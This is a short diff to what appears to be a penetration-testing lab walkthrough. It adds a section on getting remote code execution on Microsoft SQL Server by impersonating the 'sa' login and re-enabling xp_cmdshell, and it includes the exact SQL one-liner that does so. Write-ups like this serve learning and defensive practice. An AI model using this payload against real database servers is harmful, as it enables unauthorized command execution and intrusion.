@@ -210,7 +210,7 @@ Now im logged in as the admin i might be able to access the `/admin` endpoint
 
 Just as expected
 
-# MSSQL enumeration
+# RCE through MSSQL user impersonation
 
 https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html
 
@@ -239,6 +239,14 @@ It looks like i can impersonate the `sa` user, which means i can enabled and exe
 ![](Pasted%20image%2020261002201134.png)
 
 Ill then set the logon at the start of the query then re enable xp_cmdshell
+
+```python
+EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
+
+![](Pasted%20image%2020261002201240.png)
+
+I now have code execution
 
 
 
